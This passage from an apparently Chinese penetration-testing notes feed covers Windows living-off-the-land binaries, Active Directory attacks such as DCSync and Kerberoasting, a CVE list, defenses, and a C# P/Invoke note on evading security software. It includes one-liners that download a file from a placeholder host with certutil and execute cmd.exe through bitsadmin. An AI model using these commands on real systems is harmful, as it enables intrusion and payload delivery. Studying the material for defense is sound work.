/create 1 &amp; bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Complete 1 &amp; bitsadmin /reset</code></li>\n<li>代码执行  <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe &amp; bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Reset</code></li>\n</ul>\n</li>\n<li>\n<p>cdb.exe</p>\n</li>\n<li>\n<p>certutil.exe</p>\n<ul>\n<li>可安装、备份、删除、管理和执行</li>\n<li>证书证书存储相关功能</li>\n<li>下载文件  <code>certutil -urlcache -split -f https://addr/example.exe</code></li>\n<li>注意 certutil 是有 cache 的，需要显式删除</li>\n<li>base64 编解码  <code>certutil -encode</code>  /  <code>certutil -decode</code></li>\n</ul>\n</li>\n<li>\n<p>cmd.exe</p>\n</li>\n<li>\n<p>cmstp.exe</p>\n</li>\n<li>\n<p>control.exe</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGVhcmJ5dGVzLmNvbS9ibG9nL3BsYXlpbmctYXJvdW5kLXdpdGgtbnNhLWhhY2tpbmctdG9vbHMv\">加载 dll</span></li>\n</ul>\n</li>\n<li>\n<p>csc.exe</p>\n<ul>\n<li>编译 C# 载荷</li>\n</ul>\n</li>\n<li>\n<p>cscript.exe</p>\n<ul>\n<li>执行脚本</li>\n</ul>\n</li>\n<li>\n<p>extexport.exe</p>\n</li>\n<li>\n<p>expand.exe</p>\n<ul>\n<li>展开一个或多个压缩文件</li>\n</ul>\n</li>\n<li>\n<p>forfiles.exe</p>\n<ul>\n<li><code>forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe</code></li>\n</ul>\n</li>\n<li>\n<p>mofcomp.exe</p>\n</li>\n<li>\n<p>makecab.exe</p>\n</li>\n<li>\n<p>msbuild.exe</p>\n<ul>\n<li>构建应用程序</li>\n</ul>\n</li>\n<li>\n<p>mshta.exe</p>\n<ul>\n<li>HTML 应用</li>\n</ul>\n</li>\n<li>\n<p>msiexec.exe</p>\n<ul>\n<li>安装 msi</li>\n<li>加载 dll</li>\n</ul>\n</li>\n<li>\n<p>msxsl.exe</p>\n<ul>\n<li>处理 XSL 程序</li>\n</ul>\n</li>\n<li>\n<p>netsh.exe</p>\n</li>\n<li>\n<p>installutil.exe</p>\n<ul>\n<li>安装 / 卸载程序组件</li>\n</ul>\n</li>\n<li>\n<p>IEExec.exe</p>\n<ul>\n<li>.NET Framework 附带程序</li>\n</ul>\n</li>\n<li>\n<p>powershell.exe</p>\n</li>\n<li>\n<p>psexec.exe</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wc2V4ZWM=\">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</span></li>\n</ul>\n</li>\n<li>\n<p>reg.exe</p>\n<ul>\n<li>注册表控制台</li>\n</ul>\n</li>\n<li>\n<p>regedit.exe</p>\n<ul>\n<li>注册表修改</li>\n</ul>\n</li>\n<li>\n<p>regsvr32.exe</p>\n<ul>\n<li>注册动态链接库 / ActiveX 控件</li>\n</ul>\n</li>\n<li>\n<p>rundll32.exe</p>\n<ul>\n<li>执行 DLL 文件中的内部函数</li>\n</ul>\n</li>\n<li>\n<p>sc.exe</p>\n<ul>\n<li>查看服务状态管理</li>\n</ul>\n</li>\n<li>\n<p>schtasks.exe</p>\n<ul>\n<li>定时计划任务</li>\n</ul>\n</li>\n<li>\n<p>shred</p>\n<ul>\n<li>重复写入文件，防止文件恢复</li>\n</ul>\n</li>\n<li>\n<p>type.exe</p>\n<ul>\n<li>利用 ads 隐藏文件  <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></li>\n</ul>\n</li>\n<li>\n<p>wmic.exe</p>\n<ul>\n<li>Windows 管理工具</li>\n</ul>\n</li>\n<li>\n<p>windbg.exe</p>\n</li>\n<li>\n<p>winrm.exe</p>\n</li>\n<li>\n<p>wscript.exe</p>\n<ul>\n<li>脚本引擎</li>\n</ul>\n</li>\n<li>\n<p>waitfor.exe</p>\n<ul>\n<li>用于同步网络中计算机，可以发送或等待系统上的信号。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"msprc\"><a class=\"anchor\" href=\"#msprc\">#</a> MSPRC</h1>\n<p>MSRPC (Microsoft Remote Procedure Call) 是微软对 DCE/RPC 协议的修改实现，用于支持 Windows 系统中应用程序的远程网络调用。</p>\n<p>MSRPC 所使用的端口有 UDP 135 和 TCP 139 / 445 。</p>\n<p>MSRPC 可以用于</p>\n<ul>\n<li>用户遍历</li>\n<li>服务遍历</li>\n<li>凭证导出</li>\n<li>横向移动</li>\n<li>权限提升</li>\n</ul>\n<h1 id=\"域渗透\"><a class=\"anchor\" href=\"#域渗透\">#</a> 域渗透</h1>\n<h2 id=\"用户\"><a class=\"anchor\" href=\"#用户\">#</a> 用户</h2>\n<h3 id=\"用户组与工作组\"><a class=\"anchor\" href=\"#用户组与工作组\">#</a> 用户组与工作组</h3>\n<h4 id=\"用户-2\"><a class=\"anchor\" href=\"#用户-2\">#</a> 用户</h4>\n<p>Windows 系统存在一些为了特定用途而设置的用户，分别是：SYSTEM (系统)、Trustedinstaller (信任程序模块)、Everyone (所有人)、Creator Owner (创建者) 等，这些特殊用户不属于任何用户组，是完全独立的账户。其中 SYSTEM 拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。</p>\n<h4 id=\"用户组\"><a class=\"anchor\" href=\"#用户组\">#</a> 用户组</h4>\n<p>Windows 系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。</p>\n<p>默认情况下，系统为用户分了 7 个组，并给每个组赋予不同的操作权限。这些组为：管理员组 (Administrators)、高权限用户组 (Power Users)、普通用户组 (Users)、备份操作组 (Backup Operators)、文件复制组 (Replicator)、来宾用户组 (Guests)、身份验证用户组 (Authenticated Users)。</p>\n<h4 id=\"工作组\"><a class=\"anchor\" href=\"#工作组\">#</a> 工作组</h4>\n<p>工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为 workgroup 的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。</p>\n<h3 id=\"域中用户\"><a class=\"anchor\" href=\"#域中用户\">#</a> 域中用户</h3>\n<h4 id=\"域用户\"><a class=\"anchor\" href=\"#域用户\">#</a> 域用户</h4>\n<p>域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用 SID (Security Identifier) 来表明身份，用 NTLM 哈希或者 Kerberos 来验证身份。</p>\n<h4 id=\"机器用户\"><a class=\"anchor\" href=\"#机器用户\">#</a> 机器用户</h4>\n<p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以  <code>$</code>  结尾。</p>\n<h3 id=\"组策略\"><a class=\"anchor\" href=\"#组策略\">#</a> 组策略</h3>\n<p>组策略 (Group Policy) 用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略 (LGPO 或 LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作 GPO (Group Policy Object)。</p>\n<h2 id=\"内网常用协议\"><a class=\"anchor\" href=\"#内网常用协议\">#</a> 内网常用协议</h2>\n<p>Windows 查询名称解析的顺序为 DNS、mDNS、LLMNR、NBNS。</p>\n<h3 id=\"netbios\"><a class=\"anchor\" href=\"#netbios\">#</a> NetBIOS</h3>\n<p>NetBIOS（Network Basic Input/Output System）是基于网络的交互协议，通常使用 UDP 137、UDP 138、TCP 139 等端口。Windows 在安装 TCP/IP 协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。</p>\n<p>基于 NetBIOS 有 NBNS (NetBIOS Name Service) 服务，通常监听在 UDP 137 端口，该服务提供三种功能：将 NetBIOS 名称解析到 IP、查询某一个 NetBIOS 节点的状态，注册 / 释放一个 NetBIOS 名。</p>\n<p>可以使用  <code>nbtstat</code>  工具利用 NetBIOS 协议管理网络。</p>\n<h3 id=\"llmnr\"><a class=\"anchor\" href=\"#llmnr\">#</a> LLMNR</h3>\n<p>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR) 是一个基于 DNS 数据包格式的协议，IPv4 和 IPv6 的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在 Windows Vista 后被引入。 LLMNR 监听 UDP 5355 端口，可以通过多播地址 224.0.0.252 (或  <code>FF02:0:0:0:0:0:1:3</code> ) 访问。</p>\n<h3 id=\"mdns\"><a class=\"anchor\" href=\"#mdns\">#</a> mDNS</h3>\n<p>mDNS (multicast DNS) 在 Windows 10 中被引入，监听 UDP 5353 端口，对应的多播地址为 224.0.0.251 (  <code>FF02::FB</code>  ) 。mDNS 主要实现了在没有传统 DNS 服务器的情况下使局域网内的主机实现相互发现和通信。</p>\n<h3 id=\"wpad\"><a class=\"anchor\" href=\"#wpad\">#</a> WPAD</h3>\n<p>网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用 DHCP 和 / 或 DNS 发现方法来定位一个配置文件 URL 的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定 URL 应使用的代理。</p>\n<h2 id=\"域\"><a class=\"anchor\" href=\"#域\">#</a> 域</h2>\n<h3 id=\"域结构\"><a class=\"anchor\" href=\"#域结构\">#</a> 域结构</h3>\n<h4 id=\"域树\"><a class=\"anchor\" href=\"#域树\">#</a> 域树</h4>\n<p>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。</p>\n<h4 id=\"林\"><a class=\"anchor\" href=\"#林\">#</a> 林</h4>\n<p>林（Forests）是一个复杂的 AD 实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</p>\n<h3 id=\"域控制器\"><a class=\"anchor\" href=\"#域控制器\">#</a> 域控制器</h3>\n<p>ADDS 的目录存储在域控制器 (Domain Controller) 内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。</p>\n<p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</p>\n<p>AD 数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。</p>\n<p>多主机模式可以直接更新任何一台域控制器内的 AD 对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</p>\n<p>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</p>\n<h3 id=\"信任\"><a class=\"anchor\" href=\"#信任\">#</a> 信任</h3>\n<p>两个域之间需要创建信任关系，才可以访问对应域内的资源。</p>\n<h4 id=\"域信任类型\"><a class=\"anchor\" href=\"#域信任类型\">#</a> 域信任类型</h4>\n<p>Active Directory 的信任方式可以分为以下几种：</p>\n<ul>\n<li>Tree-Root Trust\n<ul>\n<li>双向具有转移性</li>\n</ul>\n</li>\n<li>Parent-Child Trust\n<ul>\n<li>具有转移性，双向行人</li>\n</ul>\n</li>\n<li>Forest Trust\n<ul>\n<li>如果两个林创建了信任关系，则林中所有的域都相互信任</li>\n<li>两个林之间的信任关系无法自动扩展到其他林上</li>\n</ul>\n</li>\n<li>Realm Trust\n<ul>\n<li>ADDS 域可以和非 Windows 系统的 Kerberos 域之间创建信任</li>\n</ul>\n</li>\n<li>External Trust\n<ul>\n<li>位于两个林内的域之间可以通过外部信任来创建信任关系</li>\n</ul>\n</li>\n<li>Shortcut Trust\n<ul>\n<li>可以缩短验证用户身份的时间</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"ou\"><a class=\"anchor\" href=\"#ou\">#</a> OU</h3>\n<p>组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU 包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。</p>\n<h2 id=\"active-directory\"><a class=\"anchor\" href=\"#active-directory\">#</a> Active Directory</h2>\n<p>活动目录 (Active Directory，AD) 是面向 Windows Server 的目录服务。Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。</p>\n<h3 id=\"adds\"><a class=\"anchor\" href=\"#adds\">#</a> ADDS</h3>\n<p>Active Directory 提供目录服务的组件被称作 Active Directory 域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</p>\n<p>从逻辑上看，ADDS 的组件可以分为 Partition、Schema、Domain、Domain tree、Forest、OU、Container。</p>\n<p>Partition 也被称为 naming context，是 AD DS 数据库的一部分。Schema 是存储在 ADDS 中数据的定义。Container 是为 ADDS 提供组织框架的对象。</p>\n<p>从实现上区分，ADDS 可以分为 Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。</p>\n<p>每个域控制器都有完整的 ADDS 数据，每个域控都可以处理数据的修改并同步至其他的域控。</p>\n<p>域控会有一份数据拷贝 (Data store) ，默认存储在  <code>C:\\Windows\\NTDS</code>  目录下。</p>\n<p>Global catalog server 是存储全局 catalog 的域控，catlog 以只读的方式存储了一个 multiple-domain forest 的所有对象，用于加速搜索。</p>\n<h3 id=\"名称空间\"><a class=\"anchor\" href=\"#名称空间\">#</a> 名称空间</h3>\n<p>名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</p>\n<h3 id=\"对象与属性\"><a class=\"anchor\" href=\"#对象与属性\">#</a> 对象与属性</h3>\n<p>ADDS 内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征。</p>\n<h2 id=\"adcs\"><a class=\"anchor\" href=\"#adcs\">#</a> ADCS</h2>\n<h3 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h3>\n<p>Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务。</p>\n<h3 id=\"证书\"><a class=\"anchor\" href=\"#证书\">#</a> 证书</h3>\n<p>ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等。</p>\n<p>证书常用的属性由下述字段组成</p>\n<ul>\n<li>Subject：主题</li>\n<li>Public Key：公钥</li>\n<li>Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)</li>\n<li>...</li>\n</ul>\n<p>常用的 EKU OID 包括：</p>\n<ul>\n<li>代码签名\n<ul>\n<li>OID 1.3.6.1.5.5.7.3.3</li>\n<li>证书用于签署可执行代码</li>\n</ul>\n</li>\n<li>加密文件系统\n<ul>\n<li>OID 1.3.6.1.4.1.311.10.3.4</li>\n<li>证书用于加密文件系统</li>\n</ul>\n</li>\n<li>安全电子邮件\n<ul>\n<li>OID 1.3.6.1.5.5.7.3.4</li>\n<li>证书用于加密电子邮件</li>\n</ul>\n</li>\n<li>客户端身份验证\n<ul>\n<li>OID 1.3.6.1.5.5.7.3.2</li>\n</ul>\n</li>\n<li>智能卡登录\n<ul>\n<li>OID 1.3.6.1.4.1.311.20.2.2</li>\n</ul>\n</li>\n<li>服务器认证\n<ul>\n<li>OID 1.3.6.1.5.5.7.3.1</li>\n<li>证书用于识别服务器 (例如 HTTPS 证书)</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"证书模板\"><a class=\"anchor\" href=\"#证书模板\">#</a> 证书模板</h4>\n<p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。</p>\n<h4 id=\"证书注册\"><a class=\"anchor\" href=\"#证书注册\">#</a> 证书注册</h4>\n<p>证书可以通过以下几种方式注册：</p>\n<ul>\n<li>通过 Windows 客户端证书注册协议 (MS-WCCE)</li>\n<li>通过 ICertPassage 远程协议 (MS-ICPR)</li>\n<li>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册</li>\n<li>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册</li>\n<li>在服务器安装了对应服务时，使用网络设备注册服务</li>\n</ul>\n<h2 id=\"组策略-2\"><a class=\"anchor\" href=\"#组策略-2\">#</a> 组策略</h2>\n<h3 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h3>\n<p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。</p>\n<p>组策略有以下功能：</p>\n<ul>\n<li>管理注册表</li>\n<li>设置脚本</li>\n<li>重定向文件夹</li>\n<li>管理应用程序</li>\n<li>指定安全选项</li>\n</ul>\n<h3 id=\"常用概念\"><a class=\"anchor\" href=\"#常用概念\">#</a> 常用概念</h3>\n<p>组策略容器 (Group Policy Container，GPC) 存储在活动目录中，包含 GPO 属性、配置信息和版本等。可以通过 GPC 来查找 GPT。</p>\n<p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。</p>\n<p>其中 GPC 中的信息量少、容量小，GPT 中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。</p>\n<p>组策略对象 (Group Policy Object, GPO) 是包含多种 Windows 组策略设置的集合，存储在 GPC 和 GPT 中。</p>\n<h2 id=\"域内攻击思路\"><a class=\"anchor\" href=\"#域内攻击思路\">#</a> 域内攻击思路</h2>\n<ul>\n<li>获取域控权限\n<ul>\n<li>通过域控相关漏洞</li>\n<li>抓 hash，尤其是域管理员、运维等高权限账号的哈希</li>\n</ul>\n</li>\n<li>控制入域机器\n<ul>\n<li>下发恶意策略控制</li>\n<li>获取域内用户凭证</li>\n<li>利用错误的域管理配置</li>\n<li>域内 relay</li>\n</ul>\n</li>\n<li>获取服务票据\n<ul>\n<li>攻击 Exchange 等服务器</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"攻击类型\"><a class=\"anchor\" href=\"#攻击类型\">#</a> 攻击类型</h2>\n<h3 id=\"黄金票据利用\"><a class=\"anchor\" href=\"#黄金票据利用\">#</a> 黄金票据利用</h3>\n<p>在认证过程中，经过 client 与 AS 的通信会得到 TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。</p>\n<p>黄金票据利用需要与 DC 通信，且需要获取 krbtgt 的 hash，但是可以获取任何 Kerbose 服务权限。</p>\n<h3 id=\"白银票据利用\"><a class=\"anchor\" href=\"#白银票据利用\">#</a> 白银票据利用</h3>\n<p>白银票据（Silver Tickets）伪造利用的是 Kerberos 认证中的第三个步骤，在第三步的时候，client 会带着 ticket 向 server 的某个服务进行请求，如果验证通过就可以访问 server 上的指定服务了，这里的 ticket 是基于 client info、server session key、end time、server hash。这里 client info 已知，end time 可以构造，server session key 是 TGS 生成的，所以只要 server 的 NTLM hash 即可。银票伪造的是 TGS，只能访问指定的服务。</p>\n<h3 id=\"dcsync攻击\"><a class=\"anchor\" href=\"#dcsync攻击\">#</a> DCSync 攻击</h3>\n<p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLWRyc3IvZjk3N2ZhYWEtNjczZS00ZjY2LWI5YmYtNDhjNjQwMjQxZDQ3\">DRSR</span> 的同步机制。</p>\n<p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。</p>\n<p>DCSync 就是使用这种机制进行域渗透的技术，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，在 2015 年添加到 mimikatz 的一个功能，可以导出域内所有用户的 hash。</p>\n<p>这种方式需要满足以下任一一种权限：</p>\n<ul>\n<li>Administrators 组内的用户</li>\n<li>Domain Admins 组内的用户</li>\n<li>Enterprise Admins 组内的用户</li>\n<li>域控制器的计算机帐户</li>\n</ul>\n<p>或者拥有特定的几条 DACL:</p>\n<ul>\n<li>DS-Replication-Get-Changes</li>\n<li>DS-Replication-Get-Changes-All</li>\n<li>DS-Replication-Get-Changes-In-Filtered-Set</li>\n</ul>\n<p>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。</p>\n<p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。</p>\n<h3 id=\"dcshadow攻击\"><a class=\"anchor\" href=\"#dcshadow攻击\">#</a> DCShadow 攻击</h3>\n<p>DCShadow 是由来自法国的安全研究人员 Benjamin Delpy 和 Vincent Le Toux 在 2018 年的微软蓝帽（Blue Hat）大会上提出。</p>\n<p>DCShadow 攻击指在 Active Directory 环境下创建一个恶意的域控制器，并用它来推送恶意对象。</p>\n<h3 id=\"哈希传递攻击\"><a class=\"anchor\" href=\"#哈希传递攻击\">#</a> 哈希传递攻击</h3>\n<p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递 NTLM 哈希来认证的攻击方法，常用的工具有 mimikatz 等。</p>\n<h3 id=\"票据传递攻击\"><a class=\"anchor\" href=\"#票据传递攻击\">#</a> 票据传递攻击</h3>\n<p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。</p>\n<h3 id=\"kerberoasting-attacks\"><a class=\"anchor\" href=\"#kerberoasting-attacks\">#</a> Kerberoasting Attacks</h3>\n<p>Kerberoasting 攻击由 Tim Medin 在 2014 DerbyCon conference 上 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1QVXlobE4tRTVNVQ==\">公开</span> 。指域内的任何一台主机，都可以通过查询 SPN，Kerberoasting 即是向域内的所有服务请求 TGS，然后进行暴力破解。</p>\n<h4 id=\"roasting-as-rep\"><a class=\"anchor\" href=\"#roasting-as-rep\">#</a> Roasting AS-REP</h4>\n<p>该攻击枚举域中不需要 Kerberos 预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了  <code>DONT_REQ_PREAUTH</code>  。</p>\n<h3 id=\"kerberos-delegation-attacks\"><a class=\"anchor\" href=\"#kerberos-delegation-attacks\">#</a> Kerberos Delegation Attacks</h3>\n<p>在一个域中，A 使用 Kerberos 身份验证访问服务 B，B 再使用 A 的身份去访问 C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</p>\n<p>Kerberos Delegation（Kerberos 委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</p>\n<h3 id=\"其他漏洞利用\"><a class=\"anchor\" href=\"#其他漏洞利用\">#</a> 其他漏洞利用</h3>\n<ul>\n<li>域用户提权 (CVE-2022-26923)</li>\n<li>KDC bamboozling (CVE-2021-42287)</li>\n<li>Name impersonation (CVE-2021-42278)</li>\n<li>ProxyShell (CVE-2021-34473)</li>\n<li>ProxyLogon (CVE-2021-26855)</li>\n<li>PrintNightmare (CVE-2021-1675 / CVE-2021-34527)</li>\n<li>SMBGhost (CVE-2020-0796)</li>\n<li>Zerologon (CVE-2020-1472)</li>\n<li>NTLM Relay (CVE-2019-1040)</li>\n<li>永恒之蓝 (MS17-010)</li>\n<li>域用户提权 (MS14-068)</li>\n<li>Gpp 漏洞 (MS14-025)</li>\n<li>SAMR 协议漏洞 (MS14-016)</li>\n</ul>\n<h2 id=\"防护\"><a class=\"anchor\" href=\"#防护\">#</a> 防护</h2>\n<ul>\n<li>使用 ATA 等商业化防护工具</li>\n<li>安装杀毒软件、EDR 等工具</li>\n<li>关闭高危服务</li>\n<li>统一配置防火墙策略</li>\n<li>对域控等高危账号使用白名单进行行为管理</li>\n<li>检测高危操作\n<ul>\n<li>权限提升</li>\n<li>高危账号密码修改、重置</li>\n</ul>\n</li>\n<li>行为频率建模\n<ul>\n<li>对大量尝试登录 / 信息查询进行报警</li>\n</ul>\n</li>\n<li>及时安装补丁</li>\n<li>对特定攻击行为进行监控\n<ul>\n<li>通过 GPO 下发自启动、计划任务</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "Windows",
                "渗透",
                "信息收集",
                "痕迹清理"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/CSharp/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/CSharp/",
            "title": "C#",
            "date_published": "2022-11-28T02:51:11.000Z",
            "content_html": "<h1 id=\"利用技巧\"><a class=\"anchor\" href=\"#利用技巧\">#</a> 利用技巧</h1>\n<h2 id=\"pinvoke\"><a class=\"anchor\" href=\"#pinvoke\">#</a> P/Invoke</h2>\n<p>Platform Invoke (P/Invoke) 提供了 C# 访问 DLL 中数据结构、回调、函数的能力。基本的使用方式如官方 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvZG90bmV0L3N0YW5kYXJkL25hdGl2ZS1pbnRlcm9wL3BpbnZva2U=\">Platform Invoke</span> 文档中所示。利用 P/Invoke 的能力，C# 程序可以较为容易的调用标准的 Windows API。</p>\n<figure class=\"highlight cs\"><figcaption data-lang=\"C#\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Runtime<span class=\"token punctuation\">.</span>InteropServices</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// Import user32.dll (containing the function we need) and define</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// the method corresponding to the native function.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"user32.dll\"</span><span class=\"token punctuation\">,</span> CharSet <span class=\"token operator\">=</span> CharSet<span class=\"token punctuation\">.</span>Unicode<span class=\"token punctuation\">,</span> SetLastError <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">int</span></span> <span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IntPtr</span> hWnd<span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> lpText<span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> lpCaption<span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token keyword\">uint</span></span> uType<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">string</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">// Invoke the function as a regular managed method.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span>IntPtr<span class=\"token punctuation\">.</span>Zero<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Command-line message box\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Attention!\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>P/Invoke 的缺点在于引用了的 API 调用会最后出现在可执行文件的 IAT 中，使得一些敏感的行为容易被防护软件所注意。同时一些敏感的 API 可能是被防护软件所监控的，通过这种方式进行的 API 调用也容易被防护软件拦截。</p>\n<h2 id=\"dinvoke\"><a class=\"anchor\" href=\"#dinvoke\">#</a> D/Invoke</h2>\n<p>在 P/Invoke 的基础上，有研究人员提出了基于 <span class=\"exturl\" 